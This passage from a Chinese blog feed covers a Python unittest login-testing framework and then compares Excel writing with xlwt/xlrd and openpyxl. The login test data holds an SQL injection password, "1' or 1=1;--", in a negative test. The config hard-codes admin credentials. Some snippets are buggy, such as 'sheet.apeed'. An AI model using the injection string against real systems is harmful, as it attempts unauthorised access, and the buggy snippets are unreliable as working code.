<p>  common 组件是公共组件，主要用于存放一些公共的模块，包括 get_toot_path (获取当前根路径)、get_config (读取配置信息)、get_test_data (读取测试数据) 等。之后如果有其他公共模块，都可以放在此组件中，供其他方法调用。
#### 3.1.1.1. get_root_path 模块 1.
为了更好地兼容各个平台，以及不同人群的代码路径保存习惯，框架在这里提供了获取当前执行代码所在路径的模块，即代码根路径。后续在读取配置信息和数据文件、以及写入测试报告等场景中，可拼接该路径，避免由于路径的不完整性，而导致代码运行
报错。 </p><figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_root_path</span>():</span><br><span class="line">    <span class="keyword">return</span> os.path.abspath(os.curdir)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Windows下方法输出示例：</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>get_root_path()</span><br><span class="line"><span class="string">'C:\\Users\\boyce'</span></span><br><span class="line"><span class="comment"># Linux下方法输出示例：</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>get_root_path()</span><br><span class="line"><span class="string">'/home/boyce/app'</span></span><br></pre></td></tr></tbody></table></figure><p></p>
<h4 id="get_config模块">3.1.1.2. get_config 模块</h4>
<ol type="1">
<li>get_config 模块主要是用于读取 config 目录下的 <code>config.yml</code> 配置文件。</li>
<li>该模块定义了一个 Config 类。在<code>__init__</code>方法中，先判断配置文件是否存在，若存在，则初始化加载配置文件中的所有内容，保存在类的 self.config 成员变量中，否则给出提示信息并退出。
<figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Config</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        file = os.path.join(get_root_path(), <span class="string">'config'</span>, <span class="string">'config.yml'</span>)</span><br><span class="line">        <span class="keyword">if</span> os.path.exists(file):</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(file, encoding=<span class="string">'utf-8'</span>) <span class="keyword">as</span> f:</span><br><span class="line">                <span class="variable language_">self</span>.config = yaml.safe_load(f.read())</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f"The <span class="subst">{file}</span> file is not exist, please check again."</span>)</span><br><span class="line">            exit(<span class="number">0</span>)</span><br></pre></td></tr></tbody></table></figure></li>
<li>以当前的配置内容为例（见 <a href="#3-1-2-config组件">3.1.2.
config 组件</a>），读取配置中的 login_url 和管理员账号信息的代码实现如下。
<figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_login_url</span>(<span class="params">self</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">self</span>.config[<span class="string">'login_url'</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_admin_info</span>(<span class="params">self</span>):</span><br><span class="line">    admin_info = (<span class="variable language_">self</span>.config[<span class="string">'admin'</span>][<span class="string">'username'</span>],</span><br><span class="line">                  <span class="variable language_">self</span>.config[<span class="string">'admin'</span>][<span class="string">'password'</span>]</span><br><span class="line">                 )</span><br><span class="line">    <span class="keyword">return</span> admin_info</span><br></pre></td></tr></tbody></table></figure> &gt; 1.
login_url 只有一个层级，只需要访问 self.config 中的 login_url 属性就可获取到。
&gt; 2.
管理员账号信息有两个层级，所以要通过二次访问，先获取到 admin 字段，再访问 admin 字段内的 username 和 password 内容，最后通过元组的形式返回。
&gt; 3.
后续如果有新增的配置内容，根据内容层级数量，按照以上两种形式进行获取即可。</li>
</ol>
<h4 id="get_test_data模块">3.1.1.3. get_test_data 模块</h4>
<ol type="1">
<li>get_test_data 模块主要是用于获取每个测试用例的测试数据和对应的预期结果。</li>
<li>实现的方式与 get_config 模块类似，定义了一个 <code>GetTestData</code> 类，来读取 yml 格式的文件。</li>
<li>需要注意的是，<code>__init__</code>方法定义中有一个 data_name 参数，所以在初始化这个对象时，需要传入测试数据 yml 文件名，告诉对象需要读取哪个测试数据文件。
<figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">GetTestData</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, data_name</span>):</span><br><span class="line">        file = os.path.join(get_root_path(), <span class="string">'testData'</span>, data_name)</span><br><span class="line">        <span class="keyword">if</span> os.path.exists(file):</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(file, encoding=<span class="string">'utf-8'</span>) <span class="keyword">as</span> f:</span><br><span class="line">                <span class="variable language_">self</span>.config = yaml.safe_load(f.read())</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f"The <span class="subst">{file}</span> file is not exist, please check again."</span>)</span><br><span class="line">            exit(<span class="number">0</span>)</span><br></pre></td></tr></tbody></table></figure></li>
<li>同时，由于测试数据和预期结果通常是与测试用例相匹配的，所以在获取测试数据和预期结果时，也需要将测试用例名称作为入参传入。获取测试数据和预期结果的实现方法分别如下所示。
<figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_data</span>(<span class="params">self, case_name</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">self</span>.config[case_name][<span class="string">'data'</span>]</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_expect</span>(<span class="params">self, case_name</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">self</span>.config[case_name][<span class="string">'expect'</span>]</span><br></pre></td></tr></tbody></table></figure></li>
</ol>
<h3 id="config组件">3.1.2. config 组件</h3>
<ol type="1">
<li>配置组件，系统级别的配置信息，都可以配置在该组件的 <code>config.yml</code> 文件中。配置完成后，需要在 <code>get_config.py</code> 文件中，添加对应配置信息的读取方法。如何定义对应的读取方法，见 <a href="#3-1-1-2-get-config模块">3.1.1.2. get_config 模块</a>章节。
<figure class="highlight yml"><table><tbody><tr><td class="code"><pre><span class="line"><span class="attr">login_url:</span> <span class="string">http://192.168.3.22/login.php</span></span><br><span class="line"></span><br><span class="line"><span class="attr">admin:</span> </span><br><span class="line">    <span class="attr">username:</span> <span class="string">admin</span></span><br><span class="line">    <span class="attr">password:</span> <span class="string">password</span></span><br></pre></td></tr></tbody></table></figure></li>
</ol>
<h3 id="teststeps组件">3.1.3. testSteps 组件</h3>
<ol type="1">
<li>测试步骤组件，以模块为维度，编写该模块下功能的测试步骤。每一个功能的测试步骤，都以类的形式实现。</li>
<li>这个组件的代码实现，既可应用于 GUI 自动化测试，也可以应用于接口自动化测试。基于 GUI 的测试步骤，可使用 selenium 框架实现；而基于接口请求的测试步骤，则可通过 requests 模块模拟请求而实现。</li>
<li>以登录功能为例，代码实现如下。
<ul>
<li>首先，定义了一个 UserLogin 类，在类的<code>__init__</code>方法中，需要提供入参，即用户登录的账号和密码。</li>
<li>然后，在 <code>authentication()</code> 方法中，新建了一个上下文管理器 s，用来初始化一个 session 对象。</li>
<li>最后，组装好正确格式的入参，使用 s 对象发送 post 请求，并返回请求后服务器的返回内容。</li>
<li>如果正常场景与异常场景的测试流程不一样，可在类中，重新定义一个针对异常场景的 <code>authentication_02()</code> 方法，在后面的 testCase 组件的对应测试用例代码中，异常场景只需调用对应的异常场景方法即可。
<figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">UserLogin</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, username, password</span>):</span><br><span class="line">        <span class="variable language_">self</span>.username = username</span><br><span class="line">        <span class="variable language_">self</span>.password = password</span><br><span class="line">        <span class="variable language_">self</span>.headers = {</span><br><span class="line">            <span class="string">"Accept"</span>: <span class="string">"*/*"</span>,</span><br><span class="line">            <span class="string">"Accept-Encoding"</span>: <span class="string">"gzip, deflate"</span>,</span><br><span class="line">            <span class="string">"Accept-Language"</span>: <span class="string">"zh-CN,zh;q=0.9,en;q=0.8"</span>,</span><br><span class="line">            <span class="string">"Cache-Control"</span>: <span class="string">"no-cache"</span>,</span><br><span class="line">            <span class="string">"Connection"</span>: <span class="string">"close"</span>,</span><br><span class="line">            <span class="string">"Host"</span>: <span class="string">"192.168.3.21"</span>,</span><br><span class="line">            <span class="string">"Pragma"</span>: <span class="string">"no-cache"</span>,</span><br><span class="line">            <span class="string">"Referer"</span>: <span class="string">"http://192.168.3.21:6759/api/v1/login"</span>,</span><br><span class="line">            <span class="string">"User-Agent"</span>: <span class="string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36 Edg/89.0.774.68"</span></span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">authentication</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">with</span> requests.Session() <span class="keyword">as</span> s:</span><br><span class="line">            <span class="comment"># 登录</span></span><br><span class="line">            param = <span class="string">'{"username": "'</span> + <span class="variable language_">self</span>.username + <span class="string">'","password": "'</span> + <span class="variable language_">self</span>.password + <span class="string">'"}'</span></span><br><span class="line"></span><br><span class="line">            r = s.post(url=login_url, data=param, verify=<span class="literal">False</span>, headers=<span class="variable language_">self</span>.headers)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> r.text</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">authentication_02</span>():</span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        异常场景登录验证步骤</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></tbody></table></figure></li>
</ul></li>
</ol>
<h3 id="testdata组件">3.1.4. testData 组件</h3>
<ol type="1">
<li>测试数据组件，测试过程中，所有的输入数据和预期结果都配置在这里。以<code>模块-功能</code>命名，保存为 <code>yml</code> 格式。通过 common 中的 <code>get_test_data</code> 方法调用读取。</li>
<li>以登录功能为例，该功能需要覆盖的场景测试数据设计如下：data 字段以 list 的形式，包含了不同用户名和密码的组合；expect 字段是预期结果，内容可以是固定的字符串，或者是正则表达式（具体形式，可由对应 testCase 中的 assert 断言方法类型进行确定）。
<figure class="highlight yml"><table><tbody><tr><td class="code"><pre><span class="line"><span class="attr">user_login_succ_01:</span></span><br><span class="line">  <span class="attr">data:</span> [<span class="string">"admin"</span>, <span class="string">"password"</span>]</span><br><span class="line">  <span class="attr">expect:</span> <span class="string">'Login successful'</span></span><br><span class="line"></span><br><span class="line"><span class="attr">user_login_failed_02:</span></span><br><span class="line">  <span class="attr">data:</span> [<span class="string">"admin"</span>, <span class="string">"123456"</span>]</span><br><span class="line">  <span class="attr">expect:</span> <span class="string">'Login failed, username or password is not correct'</span></span><br><span class="line"></span><br><span class="line"><span class="attr">user_login_failed_03:</span></span><br><span class="line">  <span class="attr">data:</span> [<span class="string">"smithy"</span>, <span class="string">"password"</span>]</span><br><span class="line">  <span class="attr">expect:</span> <span class="string">'Login failed, username or password is not correct'</span></span><br><span class="line"></span><br><span class="line"><span class="attr">user_login_failed_04:</span></span><br><span class="line">  <span class="attr">data:</span> [<span class="string">"smithy"</span>,<span class="string">"123456"</span>]</span><br><span class="line">  <span class="attr">expect:</span> <span class="string">'Login failed, username or password is not correct'</span></span><br><span class="line"></span><br><span class="line"><span class="attr">user_login_failed_05:</span></span><br><span class="line">  <span class="attr">data:</span> [<span class="string">"hacker"</span>, <span class="string">"1' or 1=1;--"</span>]</span><br><span class="line">  <span class="attr">expect:</span> <span class="string">'Login failed, username or password is not correct'</span></span><br><span class="line"></span><br><span class="line"><span class="attr">user_login_failed_06:</span></span><br><span class="line">  <span class="attr">data:</span> [<span class="string">""</span>, <span class="string">""</span>]</span><br><span class="line">  <span class="attr">expect:</span> <span class="string">'Login failed, username or password must be filled '</span></span><br></pre></td></tr></tbody></table></figure></li>
</ol>
<h3 id="testcase组件">3.1.5. testCase 组件</h3>
<ol type="1">
<li>testCase 组件与 testSteps 组件类似，同样以模块为维度，对模块下的各种功能设计测试用例，一个功能对应一个 py 文件。一个 py 文件中，包含该功能需要覆盖的正常 / 异常场景。具体的各类场景步骤，在 testSteps 组件中进行定义，测试数据，则在 testData 组件中定义。</li>
<li>例如，登录作为一个功能，对应的是整个 <code>login_case.py</code> 文件以及其中的 UserLoginCase 类；而登录功能中的 “正确用户名和密码” 场景，则对应测试类中的 user_login_succ_01 用例，代码实现如下所示。
&gt;
Tips：建议测试用例名称和数据文件中的数据名称保持一致，便于数据定位和代码编写。
<figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">UserLoginCase</span>(<span class="title class_ inherited__">TestCase</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">super</span>().__init__()</span><br><span class="line">        data_file = os.path.join(root_path, <span class="string">'testData'</span>, <span class="string">'login_101_data.yml'</span>)</span><br><span class="line">        <span class="variable language_">self</span>.data = GetTestData(data_file)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">user_login_succ_01</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        正确的用户名和密码，登录成功</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        username = <span class="variable language_">self</span>.data.get_data(<span class="string">'user_login_succ_01'</span>)[<span class="number">0</span>]</span><br><span class="line">        password =<span class="variable language_">self</span>.data.get_data(<span class="string">'user_login_succ_01'</span>)[<span class="number">1</span>]</span><br><span class="line">        expect = <span class="variable language_">self</span>.data.get_expect(<span class="string">'user_login_succ_01'</span>)</span><br><span class="line"></span><br><span class="line">        user = UserLogin(username, password)</span><br><span class="line">        res = user.authentication()</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">self</span>.assertRegex(<span class="built_in">str</span>(res), expect)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">user_login_failed_02</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        正确的用户名，错误的密码，登录失败</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></tbody></table></figure></li>
</ol>
<ul>
<li>在上述测试用例代码中，首先获取 <code>login_101_data.yml</code> 文件中的 <code>user_login_succ_01</code> 用例测试数据。</li>
<li>然后，实例化一个用户登录的对象，传入该用户的登录信息。</li>
<li>接着，通过实例化的对象 user，调用其中的 <code>authentication()</code> 方法，并接收登录验证结果。</li>
<li>最后，将实际登录结果与预期结果做一次断言，这里用到的是 assertRegex 断言，判断 expect 正则表达式是否可以在 str (res) 字符串匹配出结果，如果匹配，则断言成功，该用例的结果即为通过，否则为失败。</li>
</ul>
<h2 id="程序main函数设计">3.2. 程序 main 函数设计</h2>
<ol type="1">
<li><p>程序入口文件，是代码根路径下的 <code>main.py</code> 文件。</p></li>
<li><p>可以看到，<code>login_suite</code> 方法中，将 UserLogin 模块中的 user_login_succ_01 和 user_login_failed_02 两个用例，都添加到了 suite 中（可以理解为一个测试套件）。</p></li>
<li><p>然后，通过实例化一个测试执行的对象，传入需要执行的测试套件，选择测试报告模板，测试执行人，报告地址以及对应的报告文件名。</p></li>
<li><p>最后调用 run () 方法，启动测试。 </p><figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">login_suite</span>():</span><br><span class="line">    suite = unittest.TestSuite()</span><br><span class="line">    suite.addTest(UserLoginCase(<span class="string">'user_login_succ_01'</span>))</span><br><span class="line">    suite.addTest(UserLoginCase(<span class="string">'user_login_failed_02'</span>))</span><br><span class="line">    suite.addTest(UserLoginCase(<span class="string">'user_login_failed_03'</span>))</span><br><span class="line">    suite.addTest(UserLoginCase(<span class="string">'user_login_failed_04'</span>))</span><br><span class="line">    suite.addTest(UserLoginCase(<span class="string">'user_login_failed_05'</span>))</span><br><span class="line">    suite.addTest(UserLoginCase(<span class="string">'user_login_failed_06'</span>))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> suite</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    runner = unittestreport.TestRunner(login_suite(), templates=<span class="number">1</span>, tester=<span class="string">'FantasyBoyce'</span>, report_dir=<span class="string">'testResult/'</span>,</span><br><span class="line">                                       filename=<span class="string">'login_101_report.html'</span>,desc=<span class="string">"登录模块自动化测试报告"</span>)</span><br><span class="line">    runner.run()</span><br></pre></td></tr></tbody></table></figure><p></p></li>
<li><p>打开终端，cd 到代码根路径后，执行如下命令，开始执行测试。
</p><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment"># 进入代码根路径</span></span><br><span class="line"><span class="built_in">cd</span> ~/unit-test-demo</span><br><span class="line"></span><br><span class="line"><span class="comment"># 新建一个虚拟环境</span></span><br><span class="line">pip install virtualenv</span><br><span class="line">virtualenv .venv</span><br><span class="line"></span><br><span class="line"><span class="comment"># 激活虚拟环境</span></span><br><span class="line">.venv/Scripts/activate</span><br><span class="line"></span><br><span class="line"><span class="comment"># 安装依赖环境</span></span><br><span class="line">pip install -r requirements.txt</span><br><span class="line"></span><br><span class="line"><span class="comment"># 执行测试</span></span><br><span class="line">python main.py</span><br></pre></td></tr></tbody></table></figure><p></p></li>
<li><p>测试执行完毕后，终端输出以及测试报告如下所示。 &gt;
最后一个用例特意设置为了失败，原因是预期结果字符串中多了一个空格。
</p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">user_login_succ_01 (testCase.login_101.login_case.UserLoginCase)执行——&gt;【通过】</span><br><span class="line">user_login_failed_02 (testCase.login_101.login_case.UserLoginCase)执行——&gt;【通过】</span><br><span class="line">user_login_failed_03 (testCase.login_101.login_case.UserLoginCase)执行——&gt;【通过】</span><br><span class="line">user_login_failed_04 (testCase.login_101.login_case.UserLoginCase)执行——&gt;【通过】</span><br><span class="line">user_login_failed_05 (testCase.login_101.login_case.UserLoginCase)执行——&gt;【通过】</span><br><span class="line">user_login_failed_06 (testCase.login_101.login_case.UserLoginCase)执行——&gt;【失败】</span><br><span class="line">所有用例执行完毕，正在生成测试报告中......</span><br><span class="line">测试报告已经生成，报告路径为:testResult/login_101_report.html</span><br></pre></td></tr></tbody></table></figure><p></p></li>
</ol>
<figure>
<img src="/p/ff686ad5/login_101_report.webp" alt="测试报告样例">
<figcaption aria-hidden="true">测试报告样例</figcaption>
</figure>
<hr>
<h1 id="源码">4. 源码</h1>
<ol type="1">
<li>本框架的全套源码，已托管在 gitee 中，地址如下。 <figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">git@gitee.com:fantasyboyce/unit-test-demo.git</span><br></pre></td></tr></tbody></table></figure></li>
</ol>
]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>unittest</tag>
        <tag>自动化测试</tag>
      </tags>
  </entry>
  <entry>
    <title>【Python】基于 xlwt-xlrd 和 openpyxl 库分别实现对 Excel 表格的读写功能</title>
    <url>/p/6e3b1b9.html</url>
    <content><![CDATA[<h1 id="前言">1. 前言</h1>
<p>  最近在工作项目中实现了接口的自动化测试脚本，使用的是 Python+requests 库，利用 requests 中的 session 对象，携带登录后的用户信息发送接口请求，再将接口的状态和返回报文等信息组装成测试结果，写入 excel 表格。</p>
<p>  因为涉及到的接口比较多，在把测试结果写入 excel 表格的时候，就得需要考虑写入的效率。通过网上的一番查询和线下的请教，利用 <code>xlwt/xlrd</code> 和 <code>openpyxl</code> 这两种第三方库，实现了对表格的数据写入操作代码，特记录总结在此；另一方面，也是为了日后再有需要，可直接使用对应的代码。</p>
<span id="more"></span>
<hr>
<h1 id="执行环境">2. 执行环境</h1>
<p>  正好手里有两台不同 CPU 的电脑，索性就在两台电脑上都跑一遍，在同平台下比较第三方库之间的代码执行效率。</p>
<table>
<thead>
<tr class="header">
<th>配置项</th>
<th>笔记本</th>
<th>台式机</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>系统</td>
<td> Windows10</td>
<td>Windows10</td>
</tr>
<tr class="even">
<td>CPU</td>
<td>R7-4800U 8 核 16 线程</td>
<td> i5-8400 6 核 6 线程</td>
</tr>
<tr class="odd">
<td>内存</td>
<td> 16G</td>
<td>16G</td>
</tr>
<tr class="even">
<td> 硬盘</td>
<td> 512G 三星 SSD</td>
<td>256G 三星 SSD</td>
</tr>
</tbody>
</table>
<hr>
<h1 id="参考代码">3. 参考代码</h1>
<h2 id="xlwtxlrd库">3.1. xlwt/xlrd 库</h2>
<figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> xlwt</span><br><span class="line"><span class="keyword">import</span> xlrd</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> xlutils.copy <span class="keyword">import</span> copy</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ExcelHandle</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="comment"># 初始化保存的路径和文件名，此处以当前时间命名，如有其他需求，可自行更改</span></span><br><span class="line">        filename = <span class="string">'{}.csv'</span>.<span class="built_in">format</span>(time.strftime(<span class="string">'%Y%m%d%H%M%S'</span>))</span><br><span class="line">        <span class="variable language_">self</span>.path = os.path.join(os.getcwd(), filename)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 初始化表格的表头字段</span></span><br><span class="line">        <span class="variable language_">self</span>.__init_title = [<span class="string">'序号'</span>, <span class="string">'时间'</span>, <span class="string">'URL地址'</span>, <span class="string">'第一个数'</span>, <span class="string">'第二个数'</span>, <span class="string">'公式'</span>, <span class="string">'备注'</span>]</span><br><span class="line">        </span><br><span class="line">        <span class="variable language_">self</span>.__init_templates()</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init_templates</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="comment"># 初始化文件，生成一个仅含有表头的表格</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> os.path.exists(<span class="variable language_">self</span>.path):</span><br><span class="line">                os.remove(<span class="variable language_">self</span>.path)</span><br><span class="line">                <span class="variable language_">self</span>.__init_templates()</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="comment"># 新建一个工作表对象</span></span><br><span class="line">                workbook = xlwt.Workbook(<span class="variable language_">self</span>.path)</span><br><span class="line">                </span><br><span class="line">                <span class="comment"># 创建sheet页</span></span><br><span class="line">                sheet = workbook.add_sheet(<span class="string">'测试数据页'</span>)</span><br><span class="line">                </span><br><span class="line">                <span class="comment"># 循环之前定义的表头，从第1行第1列开始，依次写入数据</span></span><br><span class="line">                <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(<span class="variable language_">self</span>.__init_title)):</span><br><span class="line">                    sheet.write(<span class="number">0</span>, i, <span class="variable language_">self</span>.__init_title[i])</span><br><span class="line">                </span><br><span class="line">                workbook.save(<span class="variable language_">self</span>.path)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(e)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">write_content</span>(<span class="params">self, content</span>):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="comment"># 打开表格</span></span><br><span class="line">            workbook = xlrd.open_workbook(<span class="variable language_">self</span>.path)</span><br><span class="line">            <span class="comment"># 获取表格中所有的sheets页，列表类型</span></span><br><span class="line">            sheets_list = workbook.sheet_names()</span><br><span class="line">            </span><br><span class="line">            <span class="comment"># 获取第1张sheet页，序号从0开始，即最左边的sheet页。</span></span><br><span class="line">            worksheet = workbook.sheet_by_name(sheets_list[<span class="number">0</span>])</span><br><span class="line">            </span><br><span class="line">            <span class="comment"># 获取当前sheet页中已有数据的行数</span></span><br><span class="line">            row_old = worksheet.nrows</span><br><span class="line">            </span><br><span class="line">            new_workbook = copy(workbook)</span><br><span class="line">            new_worksheet = new_workbook.get_sheet(<span class="number">0</span>)</span><br><span class="line">            </span><br><span class="line">            <span class="comment"># 遍历传入的content内容，写入表格中</span></span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(<span class="variable language_">self</span>.__init_title)):</span><br><span class="line">                new_worksheet.write(row_old, j, content[j])</span><br><span class="line">            </span><br><span class="line">            new_workbook.save(<span class="variable language_">self</span>.path)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(e)</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
<h2 id="openpyxl库">3.2. openpyxl 库</h2>
<figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> openpyxl</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ExcelHandle</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="comment"># 初始化保存的路径和文件名，此处以当前时间命名，如有其他需求，可自行更改</span></span><br><span class="line">        filename = <span class="string">'{}.xlsx'</span>.<span class="built_in">format</span>(time.strftime(<span class="string">'%Y%m%d%H%M%S'</span>))</span><br><span class="line">        <span class="variable language_">self</span>.path = os.path.join(os.getcwd(), filename)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 初始化表格的表头字段</span></span><br><span class="line">        <span class="variable language_">self</span>.__init_title = [<span class="string">'序号'</span>, <span class="string">'时间'</span>, <span class="string">'URL地址'</span>, <span class="string">'第一个数'</span>, <span class="string">'第二个数'</span>, <span class="string">'公式'</span>, <span class="string">'备注'</span>]</span><br><span class="line">        </span><br><span class="line">        <span class="variable language_">self</span>.__init_templates()</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init_templates</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="comment"># 初始化文件，生成一个仅含有表头的表格</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> os.path.exists(<span class="variable language_">self</span>.path):</span><br><span class="line">                os.remove(<span class="variable language_">self</span>.path)</span><br><span class="line">                <span class="variable language_">self</span>.__init_templates()</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="comment"># 新建一个工作表对象</span></span><br><span class="line">                workbook = openpyxl.Workbook()</span><br><span class="line">                </span><br><span class="line">                <span class="comment"># 激活并重命名sheet页</span></span><br><span class="line">                sheet = workbook.active</span><br><span class="line">                sheet.title = <span class="string">'测试数据页'</span></span><br><span class="line">                </span><br><span class="line">                <span class="comment"># 循环之前定义的表头，从第1行第1列开始，依次写入数据</span></span><br><span class="line">                <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(<span class="variable language_">self</span>.__init_title)):</span><br><span class="line">                    sheet.cell(row=<span class="number">1</span>, column=i + <span class="number">1</span>, value=<span class="variable language_">self</span>.__init_title[i])</span><br><span class="line">                </span><br><span class="line">                workbook.save(<span class="variable language_">self</span>.path)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(e)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">write_content</span>(<span class="params">self, content</span>):</span><br><span class="line">        <span class="comment"># 加载excel</span></span><br><span class="line">        workbook = openpyxl.load_workbook(<span class="variable language_">self</span>.path)</span><br><span class="line">        <span class="comment"># 切换到指定的sheet页</span></span><br><span class="line">        sheet = workbook[<span class="string">'测试数据页'</span>]</span><br><span class="line">        <span class="comment"># 将content追加至sheet页中</span></span><br><span class="line">        sheet.apeed(content)</span><br><span class="line">        <span class="comment"># 保存工作表</span></span><br><span class="line">        workbook.save(<span class="variable language_">self</span>.path)</span><br></pre></td></tr></tbody></table></figure>
<hr>
<h1 id="测试数据">4. 测试数据</h1>
<p>  在项目测试的时候，涉及到的接口汇总约有 5000 来个。因为在家环境，无法构造如此庞大的真实接口数据，所以模拟生成了一组数据作为接口的测试结果，写入到 excel 表格，数据量也由 5000 个降低为 3000 个。除此之外，单条测试数据涉及到的字段也有所修改。
  测试数据的生成代码如下。</p>
<figure>
<img src="/p/6e3b1b9/测试数据生成代码.webp" alt="测试数据生成代码">
<figcaption aria-hidden="true">测试数据生成代码</figcaption>
</figure>
<hr>
<h1 id="表格写入效果">5. 表格写入效果</h1>
<figure>
<img src="/p/6e3b1b9/表格写入效果.webp" alt="表格写入效果">
<figcaption aria-hidden="true">表格写入效果</figcaption>
</figure>
<hr>
<h1 id="测试结果">6. 测试结果</h1>
<h2 id="写入速率总体统计">6.1. 写入速率总体统计</h2>
<p>  由下图可看出： 1.
在同一个 CPU 平台中，随着数据量的提升，单条数据写入耗时也随之增加。当数据量超过 1000 条时，openpyxl 库的耗时速率明显比 xlwt 库增长的更快。
2.
在同一个 CPU 平台中，针对前 N 条数据写入平均耗时和总耗时，xlwt 库低于 openpyxl 库，xlwt 库的写入速率大约是 openpyxl 库的 2.5~3 倍左右。
